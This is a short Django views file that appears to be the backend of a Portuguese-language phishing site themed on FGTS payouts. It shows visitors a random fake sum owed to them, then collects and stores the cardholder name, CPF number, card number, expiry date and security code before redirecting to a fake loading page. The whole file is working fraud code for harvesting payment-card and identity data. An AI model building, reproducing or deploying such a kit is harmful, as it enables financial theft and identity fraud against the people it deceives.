from django.shortcuts import render,redirect
from django.http import HttpResponse
from app.models import usuarios
import random
import time
# Create your views here.

def index(request): 
    if request.method == 'GET':
      io = request.COOKIES.get('p')
      
      ix = {
          'o':io,
      }
      return render(request,'fgts.html',ix)
    else:
          x = request.POST.get('nome')
          vv =  redirect('menu2')
          ll = x.split(',')[0]
          vv.set_cookie('p',x,999999)
          return vv
         #res.set_cookie(str(x),123,999999)
       
def index2(request):
 if request.method =='GET':
    arreydenumeros = ['R$3.500,30','R$500,00','R$2.250,80','R$1.000','R$R820,00','R$R700,00','R$R600','R$350,00','R$467,00']

    p = random.sample(arreydenumeros,1)
    kk = "]".join(p)
    k = {
        'a':kk,
    }
    return render(request,'copiar.html',k)
 else:
      a = usuarios()

      a.ti = request.POST.get('titulo')
      a.cpf = request.POST.get('cpf')
      a.numero = request.POST.get('ncartao')
      a.vali = request.POST.get('validade')
      a.cod = request.POST.get('codigo')
      a.save()
      
      return redirect('carre')

def carregamentocartao(request):

    return render(request,'carregamento.html')